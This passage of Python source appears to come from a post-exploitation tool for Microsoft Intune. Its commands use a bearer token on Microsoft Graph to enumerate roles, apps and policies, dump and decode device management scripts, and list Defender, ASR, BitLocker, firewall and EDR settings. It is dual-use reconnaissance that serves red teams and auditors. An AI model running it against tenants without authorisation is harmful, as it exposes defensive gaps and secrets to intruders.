    elif args.command and args.command.lower() == "get-deviceconfigurationpolicysettings":
        if not args.id:
            print_red("[-] Error: --id argument is required for Get-DeviceConfigurationPolicySettings command")
            return

        print_yellow("\n[*] Get-DeviceConfigurationPolicySettings")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/beta/deviceManagement/configurationPolicies('{args.id}')/settings?expand=settingDefinitions"

        user_agent = get_user_agent(args)
        headers = {
        'Authorization': f'Bearer {access_token}',
        'User-Agent': user_agent
        }
        
        response = requests.get(api_url, headers=headers)
        
        if response.ok:
            response_body = response.json()
            for key, value in response_body.items():
                if not key.startswith("@odata.context"):
                    pretty_value = json.dumps(value, indent=4)
                    print(f"{key}: {pretty_value}")
        else:
            print_red(f"[-] Failed to retrieve settings: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # get-deviceenrollmentconfigurations
    elif args.command and args.command.lower() == "get-deviceenrollmentconfigurations":
        print_yellow("\n[*] Get-DeviceEnrollmentConfigurations")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/deviceManagement/deviceEnrollmentConfigurations"

        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-devicegrouppolicyconfigurations
    elif args.command and args.command.lower() == "get-devicegrouppolicyconfigurations":
        print_yellow("\n[*] Get-DeviceGroupPolicyConfigurations")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/beta/deviceManagement/groupPolicyConfigurations"
        
        if args.select:
            api_url += "?$select=" + args.select
        
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': 'Bearer ' + access_token,
            'Accept': 'application/json',
            'User-Agent': user_agent
        }
        
        response = requests.get(api_url, headers=headers)
        
        if response.status_code == 200:
            group_policies = response.json()
        else:
            print_red(f"[-] Error: API request failed with status code {response.status_code}")
            group_policies = None
        
        if group_policies and 'value' in group_policies:
            for policy in group_policies['value']:
                # group policy details
                for key, value in policy.items():
                    print(f"{key} : {value}")
                
                # display assignments for the group policy
                policy_id = policy.get('id')
                if policy_id:
                    assignments_api_url = f"https://graph.microsoft.com/beta/deviceManagement/groupPolicyConfigurations/{policy_id}/assignments"
                    assignments_response = requests.get(assignments_api_url, headers=headers)
                    
                    if assignments_response.status_code == 200:
                        assignments = assignments_response.json()
                        if not assignments.get('value'):
                            print_red("assignmentTarget: No assignments")
                        else:
                            for assignment in assignments.get('value', []):
                                if 'target' in assignment:
                                    print_green(f"assignmentTarget : {assignment['target']}")
                                else:
                                    print_red("assignmentTarget: No assignments")
                    else:
                        print_red(f"[-] Error: API request for assignments failed with status code {assignments_response.status_code}")
                print("\n")
            print("=" * 80)

    # get-devicegrouppolicydefinition
    elif args.command and args.command.lower() == "get-devicegrouppolicydefinition":
        if not args.id:
            print_red("[-] Error: --id argument is required for Get-DeviceGroupPolicyDefinition command")
            return

        print_yellow("\n[*] Get-DeviceGroupPolicyDefinition")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com//beta/deviceManagement/groupPolicyConfigurations('{args.id}')/definitionValues?$expand=definition($select=id,classType,displayName,policyType,hasRelatedDefinitions,version,minUserCspVersion,minDeviceCspVersion)"

        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-roledefinitions
    elif args.command and args.command.lower() == "get-roledefinitions":
        print_yellow("\n[*] Get-RoleDefinitions")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/deviceManagement/roleDefinitions"

        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-roleassignments
    elif args.command and args.command.lower() == "get-roleassignments":
        print_yellow("\n[*] Get-RoleAssignments")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/deviceManagement/roleAssignments"

        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)


    #################################
    # Post-Auth Intune Exploitation #
    #################################

    # dump-devicemanagementscripts
    elif args.command and args.command.lower() == "dump-devicemanagementscripts":
        print_yellow("\n[*] Dump-DeviceManagementScripts")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts"

        if args.select:
            api_url += "?$select=" + args.select

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # dump-windowsapps
    elif args.command and args.command.lower() == "dump-windowsapps":
        print_yellow("\n[*] Dump-WindowsApps")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/beta/deviceAppManagement/mobileApps?$filter=(isof(%27microsoft.graph.win32CatalogApp%27)%20or%20isof(%27microsoft.graph.windowsStoreApp%27)%20or%20isof(%27microsoft.graph.microsoftStoreForBusinessApp%27)%20or%20isof(%27microsoft.graph.officeSuiteApp%27)%20or%20(isof(%27microsoft.graph.win32LobApp%27)%20and%20not(isof(%27microsoft.graph.win32CatalogApp%27)))%20or%20isof(%27microsoft.graph.windowsMicrosoftEdgeApp%27)%20or%20isof(%27microsoft.graph.windowsPhone81AppX%27)%20or%20isof(%27microsoft.graph.windowsPhone81StoreApp%27)%20or%20isof(%27microsoft.graph.windowsPhoneXAP%27)%20or%20isof(%27microsoft.graph.windowsAppX%27)%20or%20isof(%27microsoft.graph.windowsMobileMSI%27)%20or%20isof(%27microsoft.graph.windowsUniversalAppX%27)%20or%20isof(%27microsoft.graph.webApp%27)%20or%20isof(%27microsoft.graph.windowsWebApp%27)%20or%20isof(%27microsoft.graph.winGetApp%27))%20and%20(microsoft.graph.managedApp/appAvailability%20eq%20null%20or%20microsoft.graph.managedApp/appAvailability%20eq%20%27lineOfBusiness%27%20or%20isAssigned%20eq%20true)&$orderby=displayName&"

        if args.select:
            api_url += "$select=" + args.select # some fields will 400 whole req

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # dump-iosapps
    elif args.command and args.command.lower() == "dump-iosapps":
        print_yellow("\n[*] Dump-iOSApps")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/beta/deviceAppManagement/mobileApps?$filter=((isof(%27microsoft.graph.managedIOSStoreApp%27)%20and%20microsoft.graph.managedApp/appAvailability%20eq%20microsoft.graph.managedAppAvailability%27lineOfBusiness%27)%20or%20isof(%27microsoft.graph.iosLobApp%27)%20or%20isof(%27microsoft.graph.iosStoreApp%27)%20or%20isof(%27microsoft.graph.iosVppApp%27)%20or%20isof(%27microsoft.graph.managedIOSLobApp%27)%20or%20(isof(%27microsoft.graph.managedIOSStoreApp%27)%20and%20microsoft.graph.managedApp/appAvailability%20eq%20microsoft.graph.managedAppAvailability%27global%27)%20or%20isof(%27microsoft.graph.webApp%27)%20or%20isof(%27microsoft.graph.iOSiPadOSWebClip%27))%20and%20(microsoft.graph.managedApp/appAvailability%20eq%20null%20or%20microsoft.graph.managedApp/appAvailability%20eq%20%27lineOfBusiness%27%20or%20isAssigned%20eq%20true)&$orderby=displayName&"

        if args.select:
            api_url += "$select=" + args.select # some fields will 400 whole req

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # dump-macosapps
    elif args.command and args.command.lower() == "dump-macosapps":
        print_yellow("\n[*] Dump-macOSApps")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/beta/deviceAppManagement/mobileApps?$filter=(isof(%27microsoft.graph.macOSDmgApp%27)%20or%20isof(%27microsoft.graph.macOSPkgApp%27)%20or%20isof(%27microsoft.graph.macOSLobApp%27)%20or%20isof(%27microsoft.graph.macOSMicrosoftEdgeApp%27)%20or%20isof(%27microsoft.graph.macOSMicrosoftDefenderApp%27)%20or%20isof(%27microsoft.graph.macOSOfficeSuiteApp%27)%20or%20isof(%27microsoft.graph.macOsVppApp%27)%20or%20isof(%27microsoft.graph.webApp%27)%20or%20isof(%27microsoft.graph.macOSWebClip%27))%20and%20(microsoft.graph.managedApp/appAvailability%20eq%20null%20or%20microsoft.graph.managedApp/appAvailability%20eq%20%27lineOfBusiness%27%20or%20isAssigned%20eq%20true)&$orderby=displayName&"

        if args.select:
            api_url += "$select=" + args.select # some fields will 400 whole req

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # dump-androidapps
    elif args.command and args.command.lower() == "dump-androidapps":
        print_yellow("\n[*] Dump-AndroidApps")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/beta/deviceAppManagement/mobileApps?$filter=((isof(%27microsoft.graph.androidManagedStoreApp%27)%20and%20microsoft.graph.androidManagedStoreApp/isSystemApp%20eq%20true)%20or%20isof(%27microsoft.graph.androidLobApp%27)%20or%20isof(%27microsoft.graph.androidStoreApp%27)%20or%20(isof(%27microsoft.graph.managedAndroidStoreApp%27)%20and%20microsoft.graph.managedApp/appAvailability%20eq%20microsoft.graph.managedAppAvailability%27lineOfBusiness%27)%20or%20isof(%27microsoft.graph.managedAndroidLobApp%27)%20or%20(isof(%27microsoft.graph.managedAndroidStoreApp%27)%20and%20microsoft.graph.managedApp/appAvailability%20eq%20microsoft.graph.managedAppAvailability%27global%27)%20or%20(isof(%27microsoft.graph.androidManagedStoreApp%27)%20and%20microsoft.graph.androidManagedStoreApp/isSystemApp%20eq%20false)%20or%20isof(%27microsoft.graph.webApp%27))%20and%20(microsoft.graph.managedApp/appAvailability%20eq%20null%20or%20microsoft.graph.managedApp/appAvailability%20eq%20%27lineOfBusiness%27%20or%20isAssigned%20eq%20true)&$orderby=displayName&"

        if args.select:
            api_url += "$select=" + args.select # some fields will 400 whole req

        graph_api_get(access_token, api_url, args)
        print("=" * 80)

    # get-scriptcontent
    elif args.command and args.command.lower() == "get-scriptcontent":
        if not args.id:
            print_red("[-] Error: --id argument is required for Get-ScriptContent command")
            return

        print_yellow("\n[*] Get-ScriptContent")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts/{args.id}"

        if args.select:
            api_url += "&$select=" + args.select

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }

        try:
            response = requests.get(api_url, headers=headers)
            response.raise_for_status()
            json_data = response.json()
            json_data.pop('@odata.context', None)   
            
            script_content = json_data.get('scriptContent')
            if script_content:
                decoded_script_content = base64.b64decode(script_content).decode('utf-8')
                json_data['scriptContent'] = decoded_script_content

            json_data.pop('scriptContent', None)
            for key, value in json_data.items():
                print(f"{key} : {value}")

            if script_content:
                print("scriptContent :\n")
                print(decoded_script_content)

        except requests.exceptions.RequestException as ex:
            print(f"[!] HTTP Error: {ex}")
        print("=" * 80)

    # display-avpolicyrules
    elif args.command and args.command.lower() == "display-avpolicyrules":
        if not args.id:
            print_red("[-] Error: --id argument is required for Display-AVPolicyRules command")
            return

        print_yellow("\n[*] Display-AVPolicyRules")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/beta/deviceManagement/configurationPolicies('{args.id}')/settings"

        if args.select:
            api_url += "?$select=" + args.select

        user_agent = get_user_agent(args)
        headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json',
        'User-Agent': user_agent
        }
    
        settings_map = {
            "device_vendor_msft_policy_config_defender_threatseveritydefaultaction_highseveritythreats": {
                "description": "Remediation action for High severity threats",
                "values": {
                    "4=1": "Clean (service tries to recover files and try to disinfect)",
                    "4=2": "Quarantine (moves files to quarantine)",
                    "4=3": "Remove (removes files from system)",
                    "4=6": "Allow (allows file/does none of the above actions)",
                    "4=8": "User defined (requires user to make a decision on which action to take)",
                    "4=10": "Block (blocks file execution)"
                }
            },
            "device_vendor_msft_policy_config_defender_threatseveritydefaultaction_lowseveritythreats": {
                "description": "Remediation action for Low severity threats",
                "values": {
                    "1=1": "Clean (service tries to recover files and try to disinfect)",
                    "1=2": "Quarantine (moves files to quarantine)",
                    "1=3": "Remove (removes files from system)",
                    "1=6": "Allow (allows file/does none of the above actions)",
                    "1=8": "User defined (requires user to make a decision on which action to take)",
                    "1=10": "Block (blocks file execution)"
                }
            },
            "device_vendor_msft_policy_config_defender_threatseveritydefaultaction_moderateseveritythreats": {
                "description": "Remediation action for Moderate severity threats",
                "values": {
                    "2=1": "Clean (service tries to recover files and try to disinfect)",
                    "2=2": "Quarantine (moves files to quarantine)",
                    "2=3": "Remove (removes files from system)",
                    "2=6": "Allow (allows file/does none of the above actions)",
                    "2=8": "User defined (requires user to make a decision on which action to take)",
                    "2=10": "Block (blocks file execution)"
                }
            },
            "device_vendor_msft_policy_config_defender_threatseveritydefaultaction_severethreats": {
                "description": "Remediation action for Severe threats",
                "values": {
                    "5=1": "Clean (service tries to recover files and try to disinfect)",
                    "5=2": "Quarantine (moves files to quarantine)",
                    "5=3": "Remove (removes files from system)",
                    "5=6": "Allow (allows file/does none of the above actions)",
                    "5=8": "User defined (requires user to make a decision on which action to take)",
                    "5=10": "Block (blocks file execution)"
                }
            },
            "device_vendor_msft_policy_config_defender_allowarchivescanning": {
                "description": "Allow archive scanning",
                "values": {
                    "0": "Not allowed (turns off scanning on archived files)",
                    "1": "Allowed (scans the archive files)"
                }
            },
            "device_vendor_msft_policy_config_defender_allowbehaviormonitoring": {
                "description": "Allow behavior monitoring",
                "values": {
                    "0": "Not allowed (turns off behavior monitoring)",
                    "1": "Allowed (turns on real-time behavior monitoring)"
                }
            },
            "device_vendor_msft_policy_config_defender_allowcloudprotection": {
                "description": "Allow cloud protection",
                "values": {
                    "0": "Not allowed (turns off Cloud Protection)",
                    "1": "Allowed (turns on Cloud Protection"
                }
            },
            "device_vendor_msft_policy_config_defender_allowemailscanning": {
                "description": "Allow email scanning",
                "values": {
                    "0": "Not allowed (turns off email scanning)",
                    "1": "Allowed (turns on email scanning)"
                }
            },
            "device_vendor_msft_policy_config_defender_allowfullscanonmappednetworkdrives": {
                "description": "Allow full scan on mapped network drives",
                "values": {
                    "0": "Not allowed (disables scanning on mapped network drives)",
                    "1": "Allowed (scans mapped network drives)"
                }
            },
            "device_vendor_msft_policy_config_defender_allowfullscanremovabledrivescanning": {
                "description": "Allow full scan on removable drives",
                "values": {
                    "0": "Not allowed (turns off scanning on removable drives)",
                    "1": "Allowed (scans removable drives)"
                }
            },
            "device_vendor_msft_policy_config_defender_allowintrusionpreventionsystem": {
                "description": "Allow intrusion prevention system",
                "values": {
                    "0": "Not allowed",
                    "1": "Allowed"
                }
            },
            "device_vendor_msft_policy_config_defender_allowioavprotection": {
                "description": "Allow IOAV protection",
                "values": {
                    "0": "Not allowed",
                    "1": "Allowed"
                }
            },
            "device_vendor_msft_policy_config_defender_allowrealtimemonitoring": {
                "description": "Allow real-time monitoring",
                "values": {
                    "0": "Not allowed",
                    "1": "Allowed"
                }
            },
            "device_vendor_msft_policy_config_defender_allowscanningnetworkfiles": {
                "description": "Allow scanning network files",
                "values": {
                    "0": "Not allowed",
                    "1": "Allowed"
                }
            },
            "device_vendor_msft_policy_config_defender_allowscriptscanning": {
                "description": "Allow script scanning",
                "values": {
                    "0": "Not allowed",
                    "1": "Allowed"
                }
            },
            "device_vendor_msft_policy_config_defender_allowuseruiaccess": {
                "description": "Allow user UI access",
                "values": {
                    "0": "Not allowed",
                    "1": "Allowed"
                }
            },
            "device_vendor_msft_policy_config_defender_checkforsignaturesbeforerunningscan": {
                "description": "Check for signatures before running scan",
                "values": {
                    "0": "Not required",
                    "1": "Required"
                }
            },
            "device_vendor_msft_policy_config_defender_cloudblocklevel": {
                "description": "Cloud block level",
                "values": {
                    "0": "Disabled",
                    "1": "Basic",
                    "2": "High"
                }
            },
            "device_vendor_msft_policy_config_defender_disablecatchupfullscan": {
                "description": "Disable catch-up full scan",
                "values": {
                    "0": "Enabled",
                    "1": "Disabled"
                }
            },
            "device_vendor_msft_policy_config_defender_disablecatchupquickscan": {
                "description": "Disable catch-up quick scan",
                "values": {
                    "0": "Enabled",
                    "1": "Disabled"
                }
            },
            "device_vendor_msft_policy_config_defender_enablelowcpupriority": {
                "description": "Enable low CPU priority",
                "values": {
                    "0": "Disabled",
                    "1": "Enabled"
                }
            },
            "device_vendor_msft_policy_config_defender_enablenetworkprotection": {
                "description": "Enable network protection",
                "values": {
                    "0": "Disabled",
                    "1": "Enabled"
                }
            },
            "device_vendor_msft_policy_config_defender_excludedextensions": {
                "description": "Excluded extensions",
                "values": {}
            },
            "device_vendor_msft_policy_config_defender_excludedpaths": {
                "description": "Excluded paths",
                "values": {}
            },
            "device_vendor_msft_policy_config_defender_excludedprocesses": {
                "description": "Excluded processes",
                "values": {}
            },
            "device_vendor_msft_policy_config_defender_puaprotection": {
                "description": "PUA protection",
                "values": {
                    "0": "Disabled",
                    "1": "Enabled"
                }
            },
            "device_vendor_msft_policy_config_defender_realtimescandirection": {
                "description": "Real-time scan direction",
                "values": {
                    "0": "Both directions",
                    "1": "Inbound only",
                    "2": "Outbound only"
                }
            },
            "device_vendor_msft_policy_config_defender_scanparameter": {
                "description": "Scan parameter",
                "values": {
                    "0": "Quick scan",
                    "1": "Full scan"
                }
            }
        }

        response = requests.get(api_url, headers=headers)
        if response.status_code == 200:
            response_json = response.json()

            for setting in response_json.get('value', []):
                if 'settingInstance' in setting:
                    setting_instance = setting['settingInstance']
                    setting_id = setting_instance.get('settingDefinitionId', '')

                    if setting_id in settings_map:
                        description = settings_map[setting_id]['description']
                        
                        if setting_instance['@odata.type'] == '#microsoft.graph.deviceManagementConfigurationSimpleSettingCollectionInstance':
                            simple_setting_values = setting_instance.get('simpleSettingCollectionValue', [])
                            value_list = [simple_setting_value.get('value', '') for simple_setting_value in simple_setting_values if simple_setting_value.get('value')]
                            value = ', '.join(value_list)
                            print(f"{description} : {value}")
                        elif 'choiceSettingValue' in setting_instance:
                            value = setting_instance['choiceSettingValue'].get('value', '')
                            value_suffix = value[len(setting_id):].lstrip('_')
                            
                            if value_suffix in settings_map[setting_id]['values']:
                                mapped_value = settings_map[setting_id]['values'][value_suffix]
                            elif value_suffix == 'block':
                                mapped_value = 'BLOCK'
                            elif value_suffix == 'allow':
                                mapped_value = 'ALLOW'
                            else:
                                mapped_value = value_suffix.upper()

                            print(f"{mapped_value:<10} : {description}")

            # group setting collection values
            for setting in response_json.get('value', []):
                if 'settingInstance' in setting and 'groupSettingCollectionValue' in setting['settingInstance']:
                    group_settings = setting['settingInstance']['groupSettingCollectionValue']
                    for group_setting in group_settings:
                        for child in group_setting.get('children', []):
                            choice_setting_value = child.get('choiceSettingValue', {})
                            value = choice_setting_value.get('value', '')
                            setting_id = child.get('settingDefinitionId', '')

                            if setting_id in settings_map:
                                description = settings_map[setting_id]['description']
                                value_suffix = value[len(setting_id):].lstrip('_')
                                
                                if value_suffix in settings_map[setting_id]['values']:
                                    mapped_value = settings_map[setting_id]['values'][value_suffix]
                                elif value_suffix == 'block':
                                    mapped_value = 'BLOCK'
                                elif value_suffix == 'allow':
                                    mapped_value = 'ALLOW'
                                else:
                                    mapped_value = value_suffix.upper()

                                print(f"{mapped_value:<10} : {description}")

        else:
            print_red(f"[-] Failed to retrieve settings: {response.status_code}")
            print_red(response.text)
        print("=" * 80)
        

    # display-asrpolicyrules
    elif args.command and args.command.lower() == "display-asrpolicyrules":
        if not args.id:
            print_red("[-] Error: --id argument is required for Display-ASRPolicyRules command")
            return
        
        print_yellow("\n[*] Display-ASRPolicyRules")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/beta/deviceManagement/configurationPolicies('{args.id}')/settings"
        if args.select:
            api_url += "?$select=" + args.select

        user_agent = get_user_agent(args)
        headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json',
        'User-Agent': user_agent
        }

        settings_map = {
            "blockadobereaderfromcreatingchildprocesses": "Block Adobe Reader from creating child processes",
            "blockprocesscreationsfrompsexecandwmicommands": "Block process creations from PSExec and WMI commands",
            "blockexecutionofpotentiallyobfuscatedscripts": "Block execution of potentially obfuscated scripts",
            "blockpersistencethroughwmieventsubscription": "Block persistence through WMI event subscription",
            "blockwin32apicallsfromofficemacros": "Block Win32 API calls from Office macros",
            "blockofficeapplicationsfromcreatingexecutablecontent": "Block Office applications from creating executable content",
            "blockcredentialstealingfromwindowslocalsecurityauthoritysubsystem": "Block credential stealing from Windows local security authority subsystem",
            "blockexecutablefilesrunningunlesstheymeetprevalenceagetrustedlistcriterion": "Block executable files running unless they meet prevalence age trusted list criterion",
            "blockjavascriptorvbscriptfromlaunchingdownloadedexecutablecontent": "Block JavaScript or VBScript from launching downloaded executable content",
            "blockofficecommunicationappfromcreatingchildprocesses": "Block Office communication app from creating child processes",
            "blockofficeapplicationsfrominjectingcodeintootherprocesses": "Block Office applications from injecting code into other processes",
            "blockallofficeapplicationsfromcreatingchildprocesses": "Block all Office applications from creating child processes",
            "blockwebshellcreationforservers": "Block web shell creation for servers",
            "blockuntrustedunsignedprocessesthatrunfromusb": "Block untrusted unsigned processes that run from USB",
            "useadvancedprotectionagainstransomware": "Use advanced protection against ransomware",
            "blockexecutablecontentfromemailclientandwebmail": "Block executable content from email client and webmail",
            "blockabuseofexploitedvulnerablesigneddrivers": "Block abuse of exploited vulnerable signed drivers"
        }

        response = requests.get(api_url, headers=headers)

        if response.status_code == 200:
            response_json = response.json()
            
            if "value" in response_json:
                for item in response_json["value"]:
                    setting_instance = item.get("settingInstance", {})
                    group_settings = setting_instance.get("groupSettingCollectionValue", [])
                    
                    for group in group_settings:
                        children = group.get("children", [])
                        
                        for child in children:
                            choice_setting_value = child.get("choiceSettingValue", {})
                            value = choice_setting_value.get("value", "")
                            
                            if value:
                                parts = value.split("_")
                                if len(parts) >= 2:
                                    action = parts[-1].upper()
                                    rule_name = "_".join(parts[:-1])
                                    rule_name = rule_name.replace("device_vendor_msft_policy_config_defender_attacksurfacereductionrules_", "")
                                    readable_rule = settings_map.get(rule_name, rule_name)
                                    print(f"{action:<6}: {readable_rule}")
        else:
            print_red(f"[-] Failed to retrieve settings: {response.status_code}")
            print_red(response.text)
        print("=" * 80)
        
    # display-diskencryptionpolicyrules
    elif args.command and args.command.lower() == "display-diskencryptionpolicyrules":
        if not args.id:
            print_red("[-] Error: --id argument is required for Display-DiskEncryptionPolicyRules command")
            return

        print_yellow("\n[*] Display-DiskEncryptionPolicyRules")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/beta/deviceManagement/configurationPolicies('{args.id}')/settings" #?$expand=settingDefinitions"

        if args.select:
            api_url += "?$select=" + args.select

        user_agent = get_user_agent(args)
        headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json',
        'User-Agent': user_agent
        }
    
        settings_map = {
            "device_vendor_msft_bitlocker_fixeddrivesencryptiontype": "Enforce drive encryption type on fixed data drives",
            "device_vendor_msft_bitlocker_fixeddrivesrecoveryoptions": "Choose how BitLocker-protected fixed drives can be recovered",
            "device_vendor_msft_bitlocker_fixeddrivesrequireencryption": "Deny write access to fixed drives not protected by BitLocker",
            "device_vendor_msft_bitlocker_systemdrivesencryptiontype": "Enforce drive encryption type on operating system drives",
            "device_vendor_msft_bitlocker_systemdrivesrequirestartupauthentication": "Require additional authentication at startup",
            "device_vendor_msft_bitlocker_systemdrivesminimumpinlength": "Configure minimum PIN length for startup",
            "device_vendor_msft_bitlocker_systemdrivesenhancedpin": "Allow enhanced PINs for startup",
            "device_vendor_msft_bitlocker_systemdrivesdisallowstandarduserscanchangepin": "Disallow standard users from changing the PIN or password",
            "device_vendor_msft_bitlocker_systemdrivesenableprebootpinexceptionondecapabledevice": "Allow devices compliant with InstantGo or HSTI to opt out of pre-boot PIN",
            "device_vendor_msft_bitlocker_systemdrivesenableprebootinputprotectorsonslates": "Enable use of BitLocker authentication requiring preboot keyboard input on slates",
            "device_vendor_msft_bitlocker_systemdrivesrecoveryoptions": "Choose how BitLocker-protected operating system drives can be recovered",
            "device_vendor_msft_bitlocker_systemdrivesrecoverymessage": "Configure pre-boot recovery message and URL",
            "device_vendor_msft_bitlocker_removabledrivesconfigurebde": "Control use of BitLocker on removable drives",
            "device_vendor_msft_bitlocker_removabledrivesrequireencryption": "Deny write access to removable drives not protected by BitLocker",
            "device_vendor_msft_bitlocker_encryptionmethodbydrivetype": "Choose drive encryption method and cipher strength (Windows 10 [Version 1511] and later)",
            "device_vendor_msft_bitlocker_identificationfield": "Provide the unique identifiers for your organization",
            "device_vendor_msft_bitlocker_requiredeviceencryption": "Require Device Encryption",
            "device_vendor_msft_bitlocker_allowwarningforotherdiskencryption": "Allow Standard User Encryption",
            "device_vendor_msft_bitlocker_configurerecoverypasswordrotation": "Configure Recovery Password Rotation"
        }

        response = requests.get(api_url, headers=headers)

        if response.status_code == 200:
            response_json = response.json()

            for setting in response_json.get('value', []):
                if 'settingInstance' in setting and 'choiceSettingValue' in setting['settingInstance']:
                    value_field = setting['settingInstance']['choiceSettingValue'].get('value')
                    if value_field:
                        cleaned_value = value_field.rstrip('_01')
                        if cleaned_value in settings_map:
                            setting_text = settings_map[cleaned_value]
                            if value_field.endswith('_1'):
                                print(f"ENABLED   : {setting_text}")
                            elif value_field.endswith('_0'):
                                print(f"DISABLED  : {setting_text}")
                            else:
                                print(f"{setting_text} - {value_field}")

        else:
            print_red(f"[-] Failed to retrieve settings: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # display-firewallpolicyrules - firewall config
    # - todo

    # display-firewallrulepolicyrules - actual firewall rules
    elif args.command and args.command.lower() == "display-firewallrulepolicyrules":
        if not args.id:
            print_red("[-] Error: --id argument is required for Display-FirewallRulePolicyRules command")
            return

        print_yellow("\n[*] Display-FirewallRulePolicyRules")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/beta/deviceManagement/configurationPolicies('{args.id}')/settings"

        if args.select:
            api_url += "?$select=" + args.select

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }

        response = requests.get(api_url, headers=headers)

        if response.status_code == 200:
            response_json = response.json()

            for setting in response_json.get('value', []):
                if 'settingInstance' in setting and setting['settingInstance']['@odata.type'] == "#microsoft.graph.deviceManagementConfigurationGroupSettingCollectionInstance":
                    for group in setting['settingInstance'].get('groupSettingCollectionValue', []):
                        rule_name = ""
                        rule_action = ""
                        rule_direction = ""
                        rule_enabled = ""
                        rule_local_ports = ""
                        rule_remote_ports = ""
                        rule_description = ""
                        rule_interfaces = []

                        for child in group.get('children', []):
                            setting_def_id = child['settingDefinitionId']
                            if setting_def_id.endswith("_name"):
                                rule_name = child['simpleSettingValue']['value']
                            elif setting_def_id.endswith("_action_type"):
                                rule_action = "ALLOW" if child['choiceSettingValue']['value'].endswith("_0") else "BLOCK"
                            elif setting_def_id.endswith("_direction"):
                                rule_direction = "INBOUND" if child['choiceSettingValue']['value'].endswith("_in") else "OUTBOUND"
                            elif setting_def_id.endswith("_enabled"):
                                rule_enabled = "ENABLED" if child['choiceSettingValue']['value'].endswith("_1") else "DISABLED"
                            elif setting_def_id.endswith("_localportranges"):
                                rule_local_ports = ", ".join([port['value'] for port in child['simpleSettingCollectionValue']])
                            elif setting_def_id.endswith("_remoteportranges"):
                                rule_remote_ports = ", ".join([port['value'] for port in child['simpleSettingCollectionValue']])
                            elif setting_def_id.endswith("_description"):
                                rule_description = child['simpleSettingValue']['value']
                            elif setting_def_id.endswith("_interfacetypes"):
                                rule_interfaces = [iface['value'].split('_')[-1] for iface in child['choiceSettingCollectionValue']]

                        rule_interfaces = ", ".join(rule_interfaces)

                        print(f"Rule Name       : {rule_name}")
                        print(f"Action          : {rule_action}")
                        print(f"Direction       : {rule_direction}")
                        print(f"Enabled         : {rule_enabled}")
                        print(f"Local Ports     : {rule_local_ports}")
                        print(f"Remote Ports    : {rule_remote_ports}")
                        print(f"Description     : {rule_description}")
                        print(f"Interfaces      : {rule_interfaces}")
                        print()

        else:
            print_red(f"[-] Failed to retrieve settings: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # display-edrpolicyrules
    elif args.command and args.command.lower() == "display-edrpolicyrules":
        if not args.id:
            print_red("[-] Error: --id argument is required for Display-EDRPolicyRules command")
            return

        print_yellow("\n[*] Display-EDRPolicyRules")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/beta/deviceManagement/configurationPolicies('{args.id}')/settings"

        if args.select:
            api_url += "?$select=" + args.select

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }

        settings_map = {
            "device_vendor_msft_windowsadvancedthreatprotection_configurationtype": "Microsoft Defender for Endpoint client configuration package type",
            "device_vendor_msft_windowsadvancedthreatprotection_configuration_samplesharing": "Sample sharing",
        }

        response = requests.get(api_url, headers=headers)

        if response.status_code == 200:
            response_json = response.json()

            for setting in response_json.get('value', []):
                if 'settingInstance' in setting and 'choiceSettingValue' in setting['settingInstance']:
                    value_field = setting['settingInstance']['choiceSettingValue'].get('value')
                    if value_field:
                        cleaned_value = value_field.rstrip('_01onboard')
                        if cleaned_value in settings_map:
                            setting_text = settings_map[cleaned_value]
                            if value_field.endswith('_1'):
                                print(f"ENABLED   : {setting_text}")
                            elif value_field.endswith('_0'):
                                print(f"DISABLED  : {setting_text}")
                            elif value_field.endswith('_onboard'):
                                print(f"ONBOARD   : {setting_text}")
                            else:
                                print(f"{setting_text} - {value_field}")

        else:
            print_red(f"[-] Failed to retrieve settings: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # display-lapsaccountprotectionpolicyrules
    elif args.command and args.command.lower() == "display-lapsaccountprotectionpolicyrules":
        if not args.id:
            print_red("[-] Error: --id argument is required for Display-LAPSAccountProtectionPolicyRules command")
            return

        print_yellow("\n[*] Display-LAPSAccountProtectionPolicyRules")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/beta/deviceManagement/configurationPolicies('{args.id}')/settings"

        if args.select:
            api_url += "?$select=" + args.select

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
